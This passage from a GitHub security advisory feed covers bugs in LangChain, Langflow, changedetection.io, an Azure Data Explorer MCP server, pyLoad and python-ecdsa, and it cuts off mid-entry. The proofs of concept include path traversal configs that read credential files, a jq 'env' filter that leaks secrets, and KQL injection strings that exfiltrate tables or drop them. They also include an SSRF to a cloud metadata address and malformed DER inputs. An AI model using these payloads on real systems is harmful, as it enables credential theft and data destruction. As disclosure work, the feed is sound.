            <uri>https://github.com/advisories/GHSA-p4hh-mq57-gq8x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-25T21:30:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langchain-core] LangChain Core has Path Traversal vulnerabilites in legacy `load_prompt` functions]]></title>
        <id>https://github.com/advisories/GHSA-qh6h-p6c9-ff54</id>
        <link href="https://github.com/advisories/GHSA-qh6h-p6c9-ff54"/>
        <updated>2026-03-27T19:45:01.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Multiple functions in <code>langchain_core.prompts.loading</code> read files from paths embedded in deserialized config dicts without validating against directory traversal or absolute path injection. When an application passes user-influenced prompt configurations to <code>load_prompt()</code> or <code>load_prompt_from_config()</code>, an attacker can read arbitrary files on the host filesystem, constrained only by file-extension checks (<code>.txt</code> for templates, <code>.json</code>/<code>.yaml</code> for examples).</p>
<p><strong>Note:</strong> The affected functions (<code>load_prompt</code>, <code>load_prompt_from_config</code>, and the <code>.save()</code> method on prompt classes) are undocumented legacy APIs. They are superseded by the <code>dumpd</code>/<code>dumps</code>/<code>load</code>/<code>loads</code> serialization APIs in <code>langchain_core.load</code>, which do not perform filesystem reads and use an allowlist-based security model. As part of this fix, the legacy APIs have been formally deprecated and will be removed in 2.0.0.</p>
<h2 id="affected-component">Affected component</h2>
<p><strong>Package:</strong> <code>langchain-core</code>
<strong>File:</strong> <code>langchain_core/prompts/loading.py</code>
<strong>Affected functions:</strong> <code>_load_template()</code>, <code>_load_examples()</code>, <code>_load_few_shot_prompt()</code></p>
<h2 id="severity">Severity</h2>
<p><strong>High</strong> </p>
<p>The score reflects the file-extension constraints that limit which files can be read.</p>
<h2 id="vulnerable-code-paths">Vulnerable code paths</h2>
<table>
<thead>
<tr>
<th>Config key</th>
<th>Loaded by</th>
<th>Readable extensions</th>
</tr>
</thead>
<tbody><tr>
<td><code>template_path</code>, <code>suffix_path</code>, <code>prefix_path</code></td>
<td><code>_load_template()</code></td>
<td><code>.txt</code></td>
</tr>
<tr>
<td><code>examples</code> (when string)</td>
<td><code>_load_examples()</code></td>
<td><code>.json</code>, <code>.yaml</code>, <code>.yml</code></td>
</tr>
<tr>
<td><code>example_prompt_path</code></td>
<td><code>_load_few_shot_prompt()</code></td>
<td><code>.json</code>, <code>.yaml</code>, <code>.yml</code></td>
</tr>
</tbody></table>
<p>None of these code paths validated the supplied path against absolute path injection or <code>..</code> traversal sequences before reading from disk.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who controls or influences the prompt configuration dict can read files outside the intended directory:</p>
<ul>
<li><strong><code>.txt</code> files:</strong> cloud-mounted secrets (<code>/mnt/secrets/api_key.txt</code>), <code>requirements.txt</code>, internal system prompts</li>
<li><strong><code>.json</code>/<code>.yaml</code> files:</strong> cloud credentials (<code>~/.docker/config.json</code>, <code>~/.azure/accessTokens.json</code>), Kubernetes manifests, CI/CD configs, application settings</li>
</ul>
<p>This is exploitable in applications that accept prompt configs from untrusted sources, including low-code AI builders and API wrappers that expose <code>load_prompt_from_config()</code>.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<pre><code class="language-python">from langchain_core.prompts.loading import load_prompt_from_config

# Reads /tmp/secret.txt via absolute path injection
config = {
    "_type": "prompt",
    "template_path": "/tmp/secret.txt",
    "input_variables": [],
}
prompt = load_prompt_from_config(config)
print(prompt.template)  # file contents disclosed

# Reads ../../etc/secret.txt via directory traversal
config = {
    "_type": "prompt",
    "template_path": "../../etc/secret.txt",
    "input_variables": [],
}
prompt = load_prompt_from_config(config)

# Reads arbitrary .json via few-shot examples
config = {
    "_type": "few_shot",
    "examples": "../../../../.docker/config.json",
    "example_prompt": {
        "_type": "prompt",
        "input_variables": ["input", "output"],
        "template": "{input}: {output}",
    },
    "prefix": "",
    "suffix": "{query}",
    "input_variables": ["query"],
}
prompt = load_prompt_from_config(config)
</code></pre>
<h2 id="mitigation">Mitigation</h2>
<p><strong>Update <code>langchain-core</code> to &gt;= 1.2.22.</strong></p>
<p>The fix adds path validation that rejects absolute paths and <code>..</code> traversal sequences by default. An <code>allow_dangerous_paths=True</code> keyword argument is available on <code>load_prompt()</code> and <code>load_prompt_from_config()</code> for trusted inputs.</p>
<p>As described above, these legacy APIs have been formally deprecated. Users should migrate to <code>dumpd</code>/<code>dumps</code>/<code>load</code>/<code>loads</code> from <code>langchain_core.load</code>.</p>
<h2 id="credit">Credit</h2>
<ul>
<li><a href="https://github.com/jiayuqi7813">jiayuqi7813</a> reporter</li>
<li><a href="https://github.com/VladimirEliTokarev">VladimirEliTokarev</a> reporter</li>
<li><a href="https://github.com/Rickidevs">Rickidevs</a> reporter</li>
<li>Kenneth Cox (<a href="mailto:cczine@gmail.com">cczine@gmail.com</a>) reporter</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langchain-ai/langchain/security/advisories/GHSA-qh6h-p6c9-ff54">https://github.com/langchain-ai/langchain/security/advisories/GHSA-qh6h-p6c9-ff54</a></li>
<li><a href="https://github.com/langchain-ai/langchain/commit/27add913474e01e33bededf4096151130ba0d47c">https://github.com/langchain-ai/langchain/commit/27add913474e01e33bededf4096151130ba0d47c</a></li>
<li><a href="https://github.com/langchain-ai/langchain/releases/tag/langchain-core==1.2.22">https://github.com/langchain-ai/langchain/releases/tag/langchain-core==1.2.22</a></li>
<li><a href="https://github.com/advisories/GHSA-qh6h-p6c9-ff54">https://github.com/advisories/GHSA-qh6h-p6c9-ff54</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qh6h-p6c9-ff54</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-27T19:45:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow-base] Langflow: Authenticated Users Can Read, Modify, and Delete Any Flow via Missing Ownership Check]]></title>
        <id>https://github.com/advisories/GHSA-8c4j-f57c-35cf</id>
        <link href="https://github.com/advisories/GHSA-8c4j-f57c-35cf"/>
        <updated>2026-03-27T21:52:40.000Z</updated>
        <content type="html"><![CDATA[<h2 id="vulnerability">Vulnerability</h2>
<h3 id="idor-in-getpatchdelete-apiv1flowflow_id">IDOR in <code>GET/PATCH/DELETE /api/v1/flow/{flow_id}</code></h3>
<p>The <code>_read_flow</code> helper in <code>src/backend/base/langflow/api/v1/flows.py</code> branched on the <code>AUTO_LOGIN</code> setting to decide whether to filter by <code>user_id</code>. When <code>AUTO_LOGIN</code> was <code>False</code> (i.e., authentication was enabled), neither branch enforced an ownership check — the query returned any flow matching the given UUID regardless of who owned it.</p>
<p>This exposed any authenticated user to:</p>
<ul>
<li><strong>Read</strong> any other user's flow, including embedded plaintext API keys</li>
<li><strong>Modify</strong> the logic of another user's AI agents</li>
<li><strong>Delete</strong> flows belonging to other users</li>
</ul>
<p>The vulnerability was introduced by the conditional logic that was meant to accommodate public/example flows (those with <code>user_id = NULL</code>) under auto-login mode, but inadvertently left the authenticated path without an ownership filter.</p>
<hr>
<h2 id="fix-pr-8956">Fix (PR #8956)</h2>
<p>The fix removes the <code>AUTO_LOGIN</code> conditional entirely and unconditionally scopes the query to the requesting user:</p>
<pre><code class="language-diff">-    auth_settings = settings_service.auth_settings
-    stmt = select(Flow).where(Flow.id == flow_id)
-    if auth_settings.AUTO_LOGIN:
-        stmt = stmt.where(
-            (Flow.user_id == user_id) | (Flow.user_id == None)  # noqa: E711
-        )
+    stmt = select(Flow).where(Flow.id == flow_id).where(Flow.user_id == user_id)
</code></pre>
<p>All three operations — read, update, and delete — route through <code>_read_flow</code>, so the single change covers the full attack surface. A cross-user isolation test (<code>test_read_flows_user_isolation</code>) was added to prevent regression.</p>
<hr>
<h2 id="acknowledgements">Acknowledgements</h2>
<p>Langflow thanks the security researcher who responsibly disclosed this vulnerability:</p>
<ul>
<li><strong><a href="https://github.com/chximn-dt">@chximn-dt</a></strong></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-8c4j-f57c-35cf">https://github.com/langflow-ai/langflow/security/advisories/GHSA-8c4j-f57c-35cf</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/8956">https://github.com/langflow-ai/langflow/pull/8956</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34046">https://nvd.nist.gov/vuln/detail/CVE-2026-34046</a></li>
<li><a href="https://github.com/advisories/GHSA-8c4j-f57c-35cf">https://github.com/advisories/GHSA-8c4j-f57c-35cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8c4j-f57c-35cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-27T19:36:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow: Authenticated Users Can Read, Modify, and Delete Any Flow via Missing Ownership Check]]></title>
        <id>https://github.com/advisories/GHSA-8c4j-f57c-35cf</id>
        <link href="https://github.com/advisories/GHSA-8c4j-f57c-35cf"/>
        <updated>2026-03-27T21:52:40.000Z</updated>
        <content type="html"><![CDATA[<h2 id="vulnerability">Vulnerability</h2>
<h3 id="idor-in-getpatchdelete-apiv1flowflow_id">IDOR in <code>GET/PATCH/DELETE /api/v1/flow/{flow_id}</code></h3>
<p>The <code>_read_flow</code> helper in <code>src/backend/base/langflow/api/v1/flows.py</code> branched on the <code>AUTO_LOGIN</code> setting to decide whether to filter by <code>user_id</code>. When <code>AUTO_LOGIN</code> was <code>False</code> (i.e., authentication was enabled), neither branch enforced an ownership check — the query returned any flow matching the given UUID regardless of who owned it.</p>
<p>This exposed any authenticated user to:</p>
<ul>
<li><strong>Read</strong> any other user's flow, including embedded plaintext API keys</li>
<li><strong>Modify</strong> the logic of another user's AI agents</li>
<li><strong>Delete</strong> flows belonging to other users</li>
</ul>
<p>The vulnerability was introduced by the conditional logic that was meant to accommodate public/example flows (those with <code>user_id = NULL</code>) under auto-login mode, but inadvertently left the authenticated path without an ownership filter.</p>
<hr>
<h2 id="fix-pr-8956">Fix (PR #8956)</h2>
<p>The fix removes the <code>AUTO_LOGIN</code> conditional entirely and unconditionally scopes the query to the requesting user:</p>
<pre><code class="language-diff">-    auth_settings = settings_service.auth_settings
-    stmt = select(Flow).where(Flow.id == flow_id)
-    if auth_settings.AUTO_LOGIN:
-        stmt = stmt.where(
-            (Flow.user_id == user_id) | (Flow.user_id == None)  # noqa: E711
-        )
+    stmt = select(Flow).where(Flow.id == flow_id).where(Flow.user_id == user_id)
</code></pre>
<p>All three operations — read, update, and delete — route through <code>_read_flow</code>, so the single change covers the full attack surface. A cross-user isolation test (<code>test_read_flows_user_isolation</code>) was added to prevent regression.</p>
<hr>
<h2 id="acknowledgements">Acknowledgements</h2>
<p>Langflow thanks the security researcher who responsibly disclosed this vulnerability:</p>
<ul>
<li><strong><a href="https://github.com/chximn-dt">@chximn-dt</a></strong></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-8c4j-f57c-35cf">https://github.com/langflow-ai/langflow/security/advisories/GHSA-8c4j-f57c-35cf</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/8956">https://github.com/langflow-ai/langflow/pull/8956</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34046">https://nvd.nist.gov/vuln/detail/CVE-2026-34046</a></li>
<li><a href="https://github.com/advisories/GHSA-8c4j-f57c-35cf">https://github.com/advisories/GHSA-8c4j-f57c-35cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8c4j-f57c-35cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-27T19:36:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[changedetection.io] Changedetection.io Discloses Environment Variables via jq env Builtin in Include Filters]]></title>
        <id>https://github.com/advisories/GHSA-58r7-4wr5-hfx8</id>
        <link href="https://github.com/advisories/GHSA-58r7-4wr5-hfx8"/>
        <updated>2026-03-30T20:17:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>jq:</code> and <code>jqraw:</code> include filter expressions allow use of the jq <code>env</code> builtin, which reads all process environment variables and stores them as the watch snapshot. An authenticated user (or unauthenticated user when no password is set, the default) can leak sensitive environment variables including <code>SALTED_PASS</code>, <code>PLAYWRIGHT_DRIVER_URL</code>, <code>HTTP_PROXY</code>, and any secrets passed as env vars to the container.</p>
<h3 id="details">Details</h3>
<p><strong>Vulnerable file:</strong> <code>changedetectionio/html_tools.py</code>, lines 380-388</p>
<p>User-supplied jq filter expressions are compiled and executed without restricting dangerous jq builtins:</p>
<pre><code class="language-python">if json_filter.startswith("jq:"):
    jq_expression = jq.compile(json_filter.removeprefix("jq:"))
    match = jq_expression.input(json_data).all()
    return _get_stripped_text_from_json_match(match)

if json_filter.startswith("jqraw:"):
    jq_expression = jq.compile(json_filter.removeprefix("jqraw:"))
    match = jq_expression.input(json_data).all()
    return '\n'.join(str(item) for item in match)
</code></pre>
<p>The form validator at <code>forms.py:670-673</code> only checks that the expression compiles (<code>jq.compile(input)</code>) — it does not block dangerous functions. The jq <code>env</code> builtin reads all process environment variables regardless of the input data, returning a dictionary of every env var in the server process.</p>
<h3 id="poc">PoC</h3>
<p><strong>Step 1 — Create a watch for any JSON endpoint with <code>jqraw:env</code> as the include filter:</strong></p>
<pre><code class="language-bash">curl -X POST http://target:5000/api/v1/watch \
  -H "Content-Type: application/json" \
  -H "x-api-key: &lt;api-key&gt;" \
  -d '{
    "url": "https://httpbin.org/json",
    "include_filters": ["jqraw:env"],
    "time_between_check": {"seconds": 30}
  }'
</code></pre>
<p>If no password or API key is set (the default), no authentication is needed.</p>
<p><strong>Step 2 — Wait for the watch to be checked, or trigger a recheck:</strong></p>
<pre><code class="language-bash">curl "http://target:5000/api/v1/watch/&lt;uuid&gt;?recheck=true" -H "x-api-key: &lt;api-key&gt;"
</code></pre>
<p><strong>Step 3 — The processed text file on disk now contains all environment variables:</strong></p>
<pre><code>{'SALTED_PASS': '...hashed password...', 'PLAYWRIGHT_DRIVER_URL': 'ws://browser:3000',
 'HTTP_PROXY': 'socks5h://10.10.1.10:1080', 'SHELL': '/bin/bash',
 'HOME': '/root', 'PATH': '...', 'WERKZEUG_SERVER_FD': '22',
 ... and all other env vars}
</code></pre>
<p>The data is visible in the web UI when viewing the watch's latest snapshot, and is also included in notification messages if notifications are configured.</p>
<p><strong>Confirmed on v0.54.6:</strong> The processed text file stored 46 environment variables from the server process.</p>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Secret exposure:</strong> Leaks <code>SALTED_PASS</code> (password hash used for authentication), enabling offline cracking or direct session forgery</li>
<li><strong>Infrastructure credential theft:</strong> Leaks <code>PLAYWRIGHT_DRIVER_URL</code>, <code>WEBDRIVER_URL</code>, <code>HTTP_PROXY</code>/<code>HTTPS_PROXY</code>, database connection strings, and any API keys or tokens passed as environment variables</li>
<li><strong>Cascading access:</strong> Leaked proxy credentials or browser automation URLs can be used to pivot into other internal systems</li>
<li><strong>Affects all deployments using jq:</strong> Any instance where the Python <code>jq</code> module is installed (standard in Docker deployments) is vulnerable</li>
<li><strong>No authentication required by default:</strong> changedetection.io ships with no password and the API accessible without a key, so this is exploitable by any user with network access in the default configuration</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-58r7-4wr5-hfx8">https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-58r7-4wr5-hfx8</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/commit/65517a9c74a0cbe1a4661314470b28131ef5557f">https://github.com/dgtlmoon/changedetection.io/commit/65517a9c74a0cbe1a4661314470b28131ef5557f</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/releases/tag/0.54.7">https://github.com/dgtlmoon/changedetection.io/releases/tag/0.54.7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33981">https://nvd.nist.gov/vuln/detail/CVE-2026-33981</a></li>
<li><a href="https://github.com/advisories/GHSA-58r7-4wr5-hfx8">https://github.com/advisories/GHSA-58r7-4wr5-hfx8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-58r7-4wr5-hfx8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-27T19:11:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[adx-mcp-server] Azure Data Explorer MCP Server: KQL Injection in multiple tools allows MCP client to execute arbitrary Kusto queries]]></title>
        <id>https://github.com/advisories/GHSA-vphc-468g-8rfp</id>
        <link href="https://github.com/advisories/GHSA-vphc-468g-8rfp"/>
        <updated>2026-03-30T20:17:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>adx-mcp-server (&lt;= latest, commit 48b2933) contains KQL (Kusto Query Language) injection vulnerabilities in three MCP tool handlers: <code>get_table_schema</code>, <code>sample_table_data</code>, and <code>get_table_details</code>. The <code>table_name</code> parameter is interpolated directly into KQL queries via f-strings without any validation or sanitization, allowing an attacker (or a prompt-injected AI agent) to execute arbitrary KQL queries against the Azure Data Explorer cluster.</p>
<h3 id="details">Details</h3>
<p>The MCP tools construct KQL queries by directly embedding the <code>table_name</code> parameter into query strings:</p>
<p><strong>Vulnerable code</strong> (<a href="https://github.com/pab1it0/adx-mcp-server/blob/48b2933/src/adx_mcp_server/server.py#L228">permalink</a>):</p>
<pre><code class="language-python">@mcp.tool(...)
async def get_table_schema(table_name: str) -&gt; List[Dict[str, Any]]:
    client = get_kusto_client()
    query = f"{table_name} | getschema"          # &lt;-- KQL injection
    result_set = client.execute(config.database, query)
</code></pre>
<pre><code class="language-python">@mcp.tool(...)
async def sample_table_data(table_name: str, sample_size: int = 10) -&gt; List[Dict[str, Any]]:
    client = get_kusto_client()
    query = f"{table_name} | sample {sample_size}"  # &lt;-- KQL injection
    result_set = client.execute(config.database, query)
</code></pre>
<pre><code class="language-python">@mcp.tool(...)
async def get_table_details(table_name: str) -&gt; List[Dict[str, Any]]:
    client = get_kusto_client()
    query = f".show table {table_name} details"     # &lt;-- KQL injection
    result_set = client.execute(config.database, query)
</code></pre>
<p>KQL allows chaining query operators with <code>|</code> and executing management commands prefixed with <code>.</code>. An attacker can inject:</p>
<ul>
<li><code>sensitive_table | project Secret, Password | take 100 //</code> to read arbitrary tables</li>
<li>Newline-separated management commands like <code>.drop table important_data</code> via <code>get_table_details</code></li>
<li>Arbitrary KQL analytics queries via any of the three tools</li>
</ul>
<p><strong>Note:</strong> While the server also has an <code>execute_query</code> tool that accepts raw KQL by design, the three vulnerable tools are presented as safe metadata-inspection tools. MCP clients may grant automatic access to "safe" tools while requiring confirmation for <code>execute_query</code>. The injection bypasses this trust boundary.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-python"># PoC: KQL Injection via get_table_schema tool
# The table_name parameter is injected into: f"{table_name} | getschema"

import json

# MCP tool call that exfiltrates data from a sensitive table
tool_call = {
    "name": "get_table_schema",
    "arguments": {
        "table_name": "sensitive_data | project Secret, Password | take 100 //"
    }
}
print(json.dumps(tool_call, indent=2))

# Resulting KQL: "sensitive_data | project Secret, Password | take 100 // | getschema"
# The // comments out "| getschema", executing an arbitrary data query instead

# Destructive example via get_table_details:
tool_call_destructive = {
    "name": "get_table_details",
    "arguments": {
        "table_name": "users details\n.drop table critical_data"
    }
}
# Resulting KQL:
#   .show table users details
#   .drop table critical_data details
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pab1it0/adx-mcp-server/security/advisories/GHSA-vphc-468g-8rfp">https://github.com/pab1it0/adx-mcp-server/security/advisories/GHSA-vphc-468g-8rfp</a></li>
<li><a href="https://github.com/pab1it0/adx-mcp-server/commit/0abe0ee55279e111281076393e5e966335fffd30">https://github.com/pab1it0/adx-mcp-server/commit/0abe0ee55279e111281076393e5e966335fffd30</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33980">https://nvd.nist.gov/vuln/detail/CVE-2026-33980</a></li>
<li><a href="https://github.com/advisories/GHSA-vphc-468g-8rfp">https://github.com/advisories/GHSA-vphc-468g-8rfp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vphc-468g-8rfp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-27T19:08:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyload-ng] pyLoad: Server-Side Request Forgery via Download Link Submission Enables Cloud Metadata Exfiltration]]></title>
        <id>https://github.com/advisories/GHSA-m74m-f7cr-432x</id>
        <link href="https://github.com/advisories/GHSA-m74m-f7cr-432x"/>
        <updated>2026-03-30T20:15:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>PyLoad's download engine accepts arbitrary URLs without validation, enabling Server-Side Request Forgery (SSRF) attacks. An authenticated attacker can exploit this to access internal network services and exfiltrate cloud provider metadata. On DigitalOcean droplets, this exposes sensitive infrastructure data including droplet ID, network configuration, region, authentication keys, and SSH keys configured in user-data/cloud-init.</p>
<h2 id="details">Details</h2>
<p>The vulnerability exists in PyLoad's download package functionality (<code>/api/addPackage</code> endpoint), which directly passes user-supplied URLs to the download engine without validating the destination. The affected code in <code>src/pyload/webui/app/blueprints/api_blueprint.py</code>:</p>
<pre><code class="language-python">@bp.route("/addPackage", methods=["POST"], endpoint="add_package")
@login_required
def add_package():
    name = flask.request.form["add_name"]
    links = flask.request.form["add_links"].split("\n")
    # ... validation omitted ...
    api.add_package(name, links, dest)  # No URL validation
</code></pre>
<p>The download engine in <code>src/pyload/core/managers/download.py</code> accepts any URL scheme and initiates HTTP requests to arbitrary destinations, including internal network addresses and cloud metadata endpoints.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p><strong>Live Demo Instance:</strong> <a href="http://143.244.141.81:8000">http://143.244.141.81:8000</a><br><strong>Credentials:</strong> <code>pyload</code> / <code>pyload</code></p>
<ul>
<li>Login into the pyload application</li>
<li>Navigate to package tab and enter the package name and fill the Link section with the following URL</li>
</ul>
<pre><code>http://169.254.169.254/metadata/v1.json
</code></pre>
<img width="1851" height="786" alt="image" src="https://github.com/user-attachments/assets/18e7aedf-7663-4a57-8f3e-5200be2c958e">

<ul>
<li>Now navigate to Files section and download the link.</li>
</ul>
<img width="1429" height="870" alt="image" src="https://github.com/user-attachments/assets/9b8b9cd6-afb7-461c-b058-a3cc4f26e2e6">

<ul>
<li>It was observed that we are able to Read the Digital Ocean Metadata</li>
</ul>
<img width="1872" height="837" alt="image" src="https://github.com/user-attachments/assets/d30d2d74-53e9-46f8-8206-894a275ac831">

<p>The downloaded <code>v1.json</code> file contains sensitive cloud infrastructure data:</p>
<ul>
<li><strong>Droplet ID</strong>: Unique identifier for the instance</li>
<li><strong>Network Configuration</strong>: Public/private IP addresses, VPC topology</li>
<li><strong>Authentication Keys</strong>: Cloud provider auth tokens</li>
<li><strong>SSH Keys</strong>: Public keys configured in droplet metadata</li>
<li><strong>Region and Datacenter</strong>: Infrastructure location</li>
</ul>
<h2 id="impact">Impact</h2>
<p><strong>Vulnerability Type:</strong> Server-Side Request Forgery (SSRF)<br><strong>CVSS Score:</strong> 7.7 - 9.1 (High to Critical, depending on cloud deployment)</p>
<h3 id="affected-systems">Affected Systems</h3>
<ul>
<li>All PyLoad installations (version 0.5.0 and potentially earlier)</li>
<li><strong>Critical Impact</strong> on cloud deployments (AWS EC2, DigitalOcean, Google Cloud, Azure) where metadata contains:<ul>
<li>IAM credentials (AWS)</li>
<li>SSH private keys (configured in user-data)</li>
<li>API tokens and secrets</li>
<li>Database credentials stored in cloud-init</li>
</ul>
</li>
</ul>
<h3 id="attack-requirements">Attack Requirements</h3>
<ul>
<li>Valid PyLoad user account (any role - ADMIN or USER)</li>
<li>Network connectivity to PyLoad instance</li>
</ul>
<h3 id="security-impact">Security Impact</h3>
<ol>
<li><strong>Cloud Metadata Theft</strong>: Complete exfiltration of instance metadata</li>
<li><strong>Lateral Movement</strong>: Discovery and enumeration of internal network services</li>
<li><strong>Credential Exposure</strong>: Theft of cloud IAM credentials, SSH keys, API tokens</li>
<li><strong>Infrastructure Mapping</strong>: Network topology, IP addressing, service discovery</li>
</ol>
<h2 id="remediation">Remediation</h2>
<p>Implement URL validation in the download engine:</p>
<ol>
<li>Whitelist allowed URL schemes (http/https only)</li>
<li>Block requests to private IP ranges (RFC 1918, link-local addresses)</li>
<li>Block cloud metadata endpoints (169.254.169.254, metadata.google.internal, etc.)</li>
<li>Implement request destination validation before initiating downloads</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyload/pyload/security/advisories/GHSA-m74m-f7cr-432x">https://github.com/pyload/pyload/security/advisories/GHSA-m74m-f7cr-432x</a></li>
<li><a href="https://github.com/pyload/pyload/commit/b76b6d4ee5e32d2118d26afdee1d0a9e57d4bfe8">https://github.com/pyload/pyload/commit/b76b6d4ee5e32d2118d26afdee1d0a9e57d4bfe8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33992">https://nvd.nist.gov/vuln/detail/CVE-2026-33992</a></li>
<li><a href="https://github.com/advisories/GHSA-m74m-f7cr-432x">https://github.com/advisories/GHSA-m74m-f7cr-432x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m74m-f7cr-432x</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-27T18:00:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ecdsa] python-ecdsa: Denial of Service via improper DER length validation in crafted private keys]]></title>
        <id>https://github.com/advisories/GHSA-9f5j-8jwj-x28g</id>
        <link href="https://github.com/advisories/GHSA-9f5j-8jwj-x28g"/>
        <updated>2026-03-30T20:17:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An issue in the low-level DER parsing functions can cause unexpected exceptions to be raised from the public API functions.</p>
<ol>
<li><p><code>ecdsa.der.remove_octet_string()</code> accepts truncated DER where the encoded length exceeds the available buffer. For example, an OCTET STRING that declares a length of 4096 bytes but provides only 3 bytes is parsed successfully instead of being rejected.</p>
</li>
<li><p>Because of that, a crafted DER input can cause <code>SigningKey.from_der()</code> to raise an internal exception (<code>IndexError: index out of bounds on dimension 1</code>) rather than cleanly rejecting malformed DER (e.g., raising <code>UnexpectedDER</code> or <code>ValueError</code>). Applications that parse untrusted DER private keys may crash if they do not handle unexpected exceptions, resulting in a denial of service.</p>
</li>
</ol>
<h2 id="impact">Impact</h2>
<p>Potential denial-of-service when parsing untrusted DER private keys due to unexpected internal exceptions, and malformed DER acceptance due to missing bounds checks in DER helper functions.</p>
<h2 id="reproduction">Reproduction</h2>
<p>Attach and run the following PoCs:</p>
<h3 id="poc_truncated_der_octetpy">poc_truncated_der_octet.py</h3>
<pre><code class="language-python">from ecdsa.der import remove_octet_string, UnexpectedDER

# OCTET STRING (0x04)
# Declared length: 0x82 0x10 0x00  -&gt; 4096 bytes
# Actual body: only 3 bytes -&gt; truncated DER
bad = b"\x04\x82\x10\x00" + b"ABC"

try:
    body, rest = remove_octet_string(bad)
    print("[BUG] remove_octet_string accepted truncated DER.")
    print("Declared length=4096, actual body_len=", len(body), "rest_len=", len(rest))
    print("Body=", body)
    print("Rest=", rest)
except UnexpectedDER as e:
    print("[OK] Rejected malformed DER:", e)
</code></pre>
<ul>
<li>Expected: reject malformed DER when declared length exceeds available bytes</li>
<li>Actual: accepts the truncated DER and returns a shorter body</li>
<li>Example output:</li>
</ul>
<pre><code>Parsed body_len= 3 rest_len= 0 (while declared length is 4096)
</code></pre>
<h3 id="poc_signingkey_from_der_indexerrorpy">poc_signingkey_from_der_indexerror.py</h3>
<pre><code class="language-python">from ecdsa import SigningKey, NIST256p
import ecdsa

print("ecdsa version:", ecdsa.__version__)

sk = SigningKey.generate(curve=NIST256p)
good = sk.to_der()
print("Good DER len:", len(good))


def find_crashing_mutation(data: bytes):
    b = bytearray(data)

    # Try every OCTET STRING tag position and corrupt a short-form length byte
    for i in range(len(b) - 4):
        if b[i] != 0x04:  # OCTET STRING tag
            continue

        L = b[i + 1]
        if L &gt;= 0x80:
            # skip long-form lengths for simplicity
            continue

        max_possible = len(b) - (i + 2)
        if max_possible &lt;= 10:
            continue

        # Claim more bytes than exist -&gt; truncation
        newL = min(0x7F, max_possible + 20)
        b2 = bytearray(b)
        b2[i + 1] = newL

        try:
            SigningKey.from_der(bytes(b2))
        except Exception as e:
            return i, type(e).__name__, str(e)

    return None


res = find_crashing_mutation(good)
if res is None:
    print("[INFO] No exception triggered by this mutation strategy.")
else:
    i, etype, msg = res
    print("[BUG] SigningKey.from_der raised unexpected exception type.")
    print("Offset:", i, "Exception:", etype, "Message:", msg)
</code></pre>
<ul>
<li>Expected: reject malformed DER with <code>UnexpectedDER</code> or <code>ValueError</code></li>
<li>Actual: deterministically triggers an internal <code>IndexError</code> (DoS risk)</li>
<li>Example output:</li>
</ul>
<pre><code>Result: (5, 'IndexError', 'index out of bounds on dimension 1')
</code></pre>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Add “declared length must fit buffer” checks in DER helper functions similarly to the existing check in <code>remove_sequence()</code>:</p>
<ul>
